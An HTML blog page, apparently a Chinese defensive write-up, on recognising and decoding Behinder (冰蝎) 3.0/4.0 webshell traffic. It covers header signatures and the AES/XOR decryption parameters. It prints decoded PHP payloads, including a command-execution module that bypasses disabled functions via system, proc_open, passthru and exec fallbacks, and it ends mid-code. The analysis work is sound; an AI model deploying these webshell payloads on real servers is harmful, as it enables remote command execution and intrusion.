@@ -1,0 +1,365 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Webshell流量分析 | 轻安のblog</title><meta name="author" content="轻安"><meta name="copyright" content="轻安"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="冰蝎3.0流量paylaod分析：php在代码中同样会存在eval或assert等字符特征 asp中会在for循环进行一段异或处理 jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征 弱特征Content-type: application&#x2F;x-www-form-urlencoded Cache-Control">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Webshell流量分析">
+<meta property="og:url" content="https://qingannn.github.io/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html">
+<meta property="og:site_name" content="轻安のblog">
+<meta property="og:description" content="冰蝎3.0流量paylaod分析：php在代码中同样会存在eval或assert等字符特征 asp中会在for循环进行一段异或处理 jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征 弱特征Content-type: application&#x2F;x-www-form-urlencoded Cache-Control">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2024/11/24/hnSfdGNKxzFWvuo.png">
+<meta property="article:published_time" content="2024-11-24T07:52:16.000Z">
+<meta property="article:modified_time" content="2024-11-24T07:57:24.113Z">
+<meta property="article:author" content="轻安">
+<meta property="article:tag" content="hvv">
+<meta property="article:tag" content="流量特征，Webshell，研判">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2024/11/24/hnSfdGNKxzFWvuo.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://qingannn.github.io/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/node_modules/hexo-generator-searchdb/templates/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Webshell流量分析',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-11-24 15:57:24'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/07/25/vfQGdHozb2LrhtB.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2024/11/24/hnSfdGNKxzFWvuo.png')"><nav id="nav"><span id="blog-info"><a href="/" title="轻安のblog"><span class="site-name">轻安のblog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Webshell流量分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-11-24T07:52:16.000Z" title="发表于 2024-11-24 15:52:16">2024-11-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-11-24T07:57:24.113Z" title="更新于 2024-11-24 15:57:24">2024-11-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Webshell流量分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="冰蝎3-0流量"><a href="#冰蝎3-0流量" class="headerlink" title="冰蝎3.0流量"></a>冰蝎3.0流量</h1><h2 id="paylaod分析："><a href="#paylaod分析：" class="headerlink" title="paylaod分析："></a>paylaod分析：</h2><p>php在代码中同样会存在eval或assert等字符特征</p>
+<p>asp中会在for循环进行一段异或处理</p>
+<p>jsp中则利用java的反射，所以会存在ClassLoader，getClass().getClassLoader()等字符特征</p>
+<h2 id="弱特征"><a href="#弱特征" class="headerlink" title="弱特征"></a>弱特征</h2><p>Content-type: application&#x2F;x-www-form-urlencoded</p>
+<p>Cache-Control: no-cache</p>
+<p>3.0内置的默认内置16个ua（user-agent）头</p>
+<p>请求包数据经过aes加密开头总是 3Mn1yNMto</p>
+<p>响应包开头总是mAUYLzmqn</p>
+<p>如果是php 第一次请求的响应包会设立cookie Set-Cookie: PHPSESSID&#x3D;2vgpie31fachtmlts4tg5rr7a7; path&#x3D;&#x2F;</p>
+<h2 id="流量解码分析"><a href="#流量解码分析" class="headerlink" title="流量解码分析"></a>流量解码分析</h2><p>Key&#x3D;文件内的key，IV&#x3D;0123456789abcdef，Mode&#x3D;CBC，Padding&#x3D;Pkcs7</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811734-35.png" class title="img">
+
+<p>再进行base64解码</p>
+<p>命令执行部分</p>
+<p>J64_decode(‘’)里面内容进行base64解码</p>
+<p>命令在$cmd里面</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811722-1.png" class title="img">
+
+<p>对$cmd里面进行base64解码即为命令</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811722-2.png" class title="img">
+
+<p>响应包解码</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811722-3.png" class title="img">
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">KAGUACDCP2?2Vzcw==<span class="string">&quot;,&quot;</span>msg<span class="string">&quot;:&quot;</span>IOmpseWKqOWZqCBDIOS4reeahOWNt+ayoeacieagh+etvuOAgg0KIOWNt+eahOW6j+WIl+WPt+aYryBCNjZGLTQ3N0QNCg0KIEM6XHBocFxXV1cg55qE55uu5b2VDQoNCjIwMjMvMDQvMTAgIDE3OjEwICAgIDxESVI+ICAgICAgICAgIC4NCjIwMjMvMDQvMTAgIDE3OjEwICAgIDxESVI+ICAgICAgICAgIC4uDQoyMDIzLzAyLzA0ICAyMjoyOSAgICA8RElSPiAgICAgICAgICAxDQoyMDIzLzAyLzA0ICAyMzowNCAgICAgICAgICAgICAxLDIyNiAxLmpzDQoyMDIzLzA0LzA5ICAyMzowNSAgICAgICAgICAgICAgICAgMyAxLnBocA0KMjAyMy8wMy8xMyAgMjA6NDUgICAgPERJUj4gICAgICAgICAgMg0KMjAyMy8wNC8wNiAgMjE6MjEgICAgICAgICAgICAgICA5MjQgMi5qcw0KMjAyMy8wNC8wOSAgMTY6NTEgICAgICAgICAgICAgICAyMDcgMi5waHANCjIwMjMvMDMvMzEgIDEyOjQwICAgIDxESVI+ICAgICAgICAgIDMNCjIwMjMvMDMvMTcgIDE1OjI0ICAgICAgICAgICAgICAgNjMxIDMucGhwDQoyMDIzLzA0LzA5ICAyMjo0OCAgICAgICAgICAgICAgICAzMSA2LnBocA0KMjAyMy8wNC8wOSAgMjI6NTAgICAgICAgICAgICAgICAgMzEgOC5waHANCjIwMjMvMDQvMDkgIDIzOjAyICAgICAgICAgICAgICAgIDM0IDkucGhwDQoyMDIzLzA0LzA5ICAyMzowMSAgICAgICAgICAgICAgICAzNCBhYmNkZTMucGhwDQoyMDIzLzA0LzA5ICAyMjo1NiAgICAgICAgICAgICAgICAzNCBkZW1vMS5waHANCjIwMjMvMDQvMDkgIDIyOjU4ICAgICAgICAgICAgICAgIDM0IGRlbW8yLnBocA0KMjAyMy8wNC8wOSAgMjI6NTkgICAgICAgICAgICAgICAgMzMgZGVtbzMucGhwDQoyMDIzLzA0LzA5ICAyMzowMyAgICAgICAgICAgICAgICAzNCBkZW1vNi5waHANCjIwMjMvMDQvMDkgIDIzOjA0ICAgICAgICAgICAgICAgIDI4IGRlbW83LnBocA0KMjAxNC8wMi8yNyAgMjM6MDIgICAgICAgICAgICAyMSwyMDEgbC5waHANCjIwMjMvMDMvMjIgIDE5OjUzICAgICAgICAgICAgIDEsNjMzIG1hdGgucGhwDQoyMDIzLzA0LzAzICAyMTo0MiAgICAgICAgICAgICAyLDU1MyBtcy5waHANCjIwMTMvMDUvMDkgIDIwOjU2ICAgICAgICAgICAgICAgIDIzIHBocGluZm8ucGhwDQoyMDIzLzAyLzA0ICAyMjoxMiAgICA8RElSPiAgICAgICAgICBwaHBNeUFkbWluDQoyMDIzLzAzLzEzICAyMTowMiAgICAgICAgMTksNjkzLDM4NCBwaHB6em1oX21vemhvbmdodW9kb25nYmFvbWluZ3hpdG9uZ19lYXNjay5jb20uemlwDQoyMDIzLzAzLzMxICAxMjo0NCAgICAgICAgICAgICA0LDYxNyBzYXZlX2FjdGl2aXR5LnBocA0KMjAyMS8wNC8wOCAgMjE6MTYgICAgICAgICAgICAgICA2NDMgc2hlbGwucGhwDQoyMDIzLzAzLzE2ICAyMjowMyAgICAgICAgICAgICAgIDIwNSBzai5waHANCjIwMjMvMDMvMTMgIDIwOjE5ICAgICAgICAxMyw3MTcsNjc2IHRlY216LWV2ZW50LXY1LjAuMF8yLnppcA0KMjAyMy8wMy8xNSAgMjM6MTcgICAgICAgICAgICAgICAgNzEgd2hpbGUucGhwDQoyMDIzLzA0LzA5ICAyMjozMyAgICAgICAgICAgICAgIDg2MCB4cy5waHANCjIwMjMvMDQvMDUgIDE2OjA5ICAgICAgICAgICAgICAgNTAzIOacrOWcsOejgeebmCAoQykgLSDlv6vmjbfmlrnlvI8ubG5rDQogICAgICAgICAgICAgIDI2IOS4quaWh+S7tiAgICAgMzMsNDQ2LDY1MyDlrZfoioINCiAgICAgICAgICAgICAgIDYg5Liq55uu5b2VIDMyLDYxMywzNTUsNTIwIOWPr+eUqOWtl+iKgg0K<span class="string">&quot;&#125;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811722-4.png" class title="img">
+
+<h1 id="冰蝎4-0"><a href="#冰蝎4-0" class="headerlink" title="冰蝎4.0"></a>冰蝎4.0</h1><p>冰蝎4.0解码需要在传输协议中选择相应的协议类型替换key</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811722-5.png" class title="img">
+
+<p>xor_base64类型</p>
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811722-6.png" class title="img">
+
+<img src="/2024/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/11/24/Webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1732434811723-7.png" class title="img">
+
+<p>此为第一次连接数据包</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);<span class="keyword">function</span> main(<span class="variable">$taskID</span>, <span class="variable">$action</span>, <span class="variable">$payload</span>)&#123;    @set_time_limit(0);    @ignore_user_abort(1);    @ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, 0);    <span class="variable">$result</span> = array();    <span class="keyword">if</span> (<span class="variable">$action</span> == <span class="string">&quot;submit&quot;</span>) &#123;        @session_start();        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="variable">$taskID</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="variable">$taskID</span>][<span class="string">&quot;running&quot;</span>]) &#123;            <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;fail&quot;</span>);            <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(<span class="string">&quot;鍚屼竴涓彃浠跺彧鍏佽鍚屾椂杩愯涓?涓换鍔°??&quot;</span>);            <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));             <span class="built_in">return</span>;        &#125;        @session_write_close();        try        &#123;            <span class="built_in">eval</span>(base64_decode(<span class="variable">$payload</span>));        &#125;        catch(Throwable <span class="variable">$e</span>)        &#123;            <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="string">&quot;fail&quot;</span>;            <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="variable">$e</span>-&gt;getMessage();            <span class="built_in">echo</span> <span class="string">&quot;Errror&quot;</span>;            <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));            <span class="built_in">return</span>;        &#125;        finish();        execute(<span class="variable">$taskID</span>,<span class="variable">$params</span>);    &#125;    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span>==<span class="string">&quot;exec&quot;</span>)    &#123;        @session_start();        <span class="keyword">if</span> (isset(<span class="variable">$_SESSION</span>[<span class="variable">$taskID</span>]) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="variable">$taskID</span>][<span class="string">&quot;running&quot;</span>]) &#123;            <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="string">&quot;fail&quot;</span>;            <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="string">&quot;鍚屼竴涓彃浠跺彧鍏佽鍚屾椂杩愯涓?涓换鍔°??&quot;</span>;            <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));             <span class="built_in">return</span>;        &#125;        @session_write_close();        try        &#123;            <span class="built_in">eval</span>(base64_decode(<span class="variable">$payload</span>));            <span class="variable">$taskResult</span>=array();            execute(<span class="variable">$taskResult</span>,<span class="variable">$params</span>);            <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="string">&quot;success&quot;</span>;            <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = json_encode(<span class="variable">$taskResult</span>);        &#125;        catch(Throwable <span class="variable">$e</span>)        &#123;            <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="string">&quot;fail&quot;</span>;            <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="variable">$e</span>-&gt;getMessage();        &#125;        finally        &#123;            <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));            <span class="built_in">return</span>;        &#125;    &#125;    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span>==<span class="string">&quot;getResult&quot;</span>)    &#123;        @session_start();        <span class="variable">$taskResult</span>=<span class="variable">$_SESSION</span>[<span class="variable">$taskID</span>];        <span class="variable">$taskResult</span>[<span class="string">&quot;running&quot;</span>] = base64_encode(<span class="variable">$taskResult</span>[<span class="string">&quot;running&quot;</span>]);        <span class="variable">$taskResult</span>[<span class="string">&quot;result&quot;</span>] = base64_encode(<span class="variable">$taskResult</span>[<span class="string">&quot;result&quot;</span>]);        @session_write_close();        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;success&quot;</span>);        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(json_encode(<span class="variable">$taskResult</span>));        <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));        <span class="built_in">return</span>;    &#125;    <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span>==<span class="string">&quot;stop&quot;</span>)    &#123;        @session_start();        <span class="variable">$_SESSION</span>[<span class="variable">$taskID</span>][<span class="string">&quot;running&quot;</span>] = <span class="string">&quot;false&quot;</span>;        @session_write_close();        <span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = base64_encode(<span class="string">&quot;success&quot;</span>);        <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = base64_encode(<span class="string">&quot;ok&quot;</span>);        <span class="built_in">echo</span> encrypt(json_encode(<span class="variable">$result</span>));        <span class="built_in">return</span>;    &#125;&#125;<span class="keyword">function</span> <span class="function"><span class="title">finish</span></span>()&#123;    ob_end_clean();    header(<span class="string">&quot;Connection: close&quot;</span>);    ignore_user_abort();    ob_start();    <span class="variable">$size</span> = ob_get_length();    header(<span class="string">&quot;Content-Length: <span class="variable">$size</span>&quot;</span>);    ob_end_flush();    flush();&#125;<span class="keyword">function</span> Encrypt(<span class="variable">$data</span>)&#123;    <span class="variable">$key</span>=<span class="string">&quot;e45e329feb5d925b&quot;</span>; <span class="keyword">for</span>(<span class="variable">$i</span>=0;<span class="variable">$i</span>&lt;strlen(<span class="variable">$data</span>);<span class="variable">$i</span>++) &#123;    <span class="variable">$data</span>[<span class="variable">$i</span>] = <span class="variable">$data</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+1&amp;15];     &#125;    <span class="variable">$bs</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;encode&quot;</span>;<span class="variable">$after</span>=<span class="variable">$bs</span>(<span class="variable">$data</span>.<span class="string">&quot;&quot;</span>);    <span class="built_in">return</span> <span class="variable">$after</span>;&#125;<span class="variable">$taskID</span>=<span class="string">&quot;U2VydmljZVNjYW4=&quot;</span>;<span class="variable">$taskID</span>=base64_decode(<span class="variable">$taskID</span>);<span class="variable">$action</span>=<span class="string">&quot;Z2V0UmVzdWx0&quot;</span>;<span class="variable">$action</span>=base64_decode(<span class="variable">$action</span>);<span class="variable">$payload</span>=<span class="string">&quot;&quot;</span>;main(<span class="variable">$taskID</span>,<span class="variable">$action</span>,<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure>
+
+<p>命令执行部分数据包</p>
+<p>命令在$cmd中</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);<span class="keyword">function</span> getSafeStr(<span class="variable">$str</span>)&#123;    <span class="variable">$s1</span> = iconv(<span class="string">&#x27;utf-8&#x27;</span>,<span class="string">&#x27;gbk//IGNORE&#x27;</span>,<span class="variable">$str</span>);    <span class="variable">$s0</span> = iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$s1</span>);    <span class="keyword">if</span>(<span class="variable">$s0</span> == <span class="variable">$str</span>)&#123;        <span class="built_in">return</span> <span class="variable">$s0</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="built_in">return</span> iconv(<span class="string">&#x27;gbk&#x27;</span>,<span class="string">&#x27;utf-8//IGNORE&#x27;</span>,<span class="variable">$str</span>);    &#125;&#125;<span class="keyword">function</span> main(<span class="variable">$cmd</span>,<span class="variable">$path</span>)&#123;    @set_time_limit(0);    @ignore_user_abort(1);    @ini_set(<span class="string">&#x27;max_execution_time&#x27;</span>, 0);    <span class="variable">$result</span> = array();    <span class="variable">$PadtJn</span> = @ini_get(<span class="string">&#x27;disable_functions&#x27;</span>);    <span class="keyword">if</span> (! empty(<span class="variable">$PadtJn</span>)) &#123;        <span class="variable">$PadtJn</span> = preg_replace(<span class="string">&#x27;/[, ]+/&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);        <span class="variable">$PadtJn</span> = explode(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$PadtJn</span>);        <span class="variable">$PadtJn</span> = array_map(<span class="string">&#x27;trim&#x27;</span>, <span class="variable">$PadtJn</span>);    &#125; <span class="keyword">else</span> &#123;        <span class="variable">$PadtJn</span> = array();    &#125;    <span class="variable">$c</span> = <span class="variable">$cmd</span>;    <span class="keyword">if</span> (FALSE !== strpos(strtolower(PHP_OS), <span class="string">&#x27;win&#x27;</span>)) &#123;        <span class="variable">$c</span> = <span class="variable">$c</span> . <span class="string">&quot; 2&gt;&amp;1\n&quot;</span>;    &#125;    <span class="variable">$JueQDBH</span> = <span class="string">&#x27;is_callable&#x27;</span>;    <span class="variable">$Bvce</span> = <span class="string">&#x27;in_array&#x27;</span>;    <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;system&#x27;</span>) and ! <span class="variable">$Bvce</span>(<span class="string">&#x27;system&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;        ob_start();        system(<span class="variable">$c</span>);        <span class="variable">$kWJW</span> = ob_get_contents();        ob_end_clean();    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;proc_open&#x27;</span>) and ! <span class="variable">$Bvce</span>(<span class="string">&#x27;proc_open&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;        <span class="variable">$handle</span> = proc_open(<span class="variable">$c</span>, array(            array(                <span class="string">&#x27;pipe&#x27;</span>,                <span class="string">&#x27;r&#x27;</span>            ),            array(                <span class="string">&#x27;pipe&#x27;</span>,                <span class="string">&#x27;w&#x27;</span>            ),            array(                <span class="string">&#x27;pipe&#x27;</span>,                <span class="string">&#x27;w&#x27;</span>            )        ), <span class="variable">$pipes</span>);        <span class="variable">$kWJW</span> = NULL;        <span class="keyword">while</span> (! feof(<span class="variable">$pipes</span>[1])) &#123;            <span class="variable">$kWJW</span> .= fread(<span class="variable">$pipes</span>[1], 1024);        &#125;        @proc_close(<span class="variable">$handle</span>);    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;passthru&#x27;</span>) and ! <span class="variable">$Bvce</span>(<span class="string">&#x27;passthru&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;        ob_start();        passthru(<span class="variable">$c</span>);        <span class="variable">$kWJW</span> = ob_get_contents();        ob_end_clean();    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;shell_exec&#x27;</span>) and ! <span class="variable">$Bvce</span>(<span class="string">&#x27;shell_exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;        <span class="variable">$kWJW</span> = shell_exec(<span class="variable">$c</span>);    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) and ! <span class="variable">$Bvce</span>(<span class="string">&#x27;exec&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;        <span class="variable">$kWJW</span> = array();        <span class="built_in">exec</span>(<span class="variable">$c</span>, <span class="variable">$kWJW</span>);        <span class="variable">$kWJW</span> = <span class="built_in">join</span>(chr(10), <span class="variable">$kWJW</span>) . chr(10);    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$JueQDBH</span>(<span class="string">&#x27;exec&#x27;</span>) and ! <span class="variable">$Bvce</span>(<span class="string">&#x27;popen&#x27;</span>, <span class="variable">$PadtJn</span>)) &#123;        <span class="variable">$fp</span> = popen(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>);        <span class="variable">$kWJW</span> = NULL;        <span class="keyword">if</span> (is_resource(<span class="variable">$fp</span>)) &#123;            <span class="keyword">while</span> (! feof(<span class="variable">$fp</span>)) &#123;                <span class="variable">$kWJW</span> .= fread(<span class="variable">$fp</span>, 1024);            &#125;        &#125;        @pclose(<span 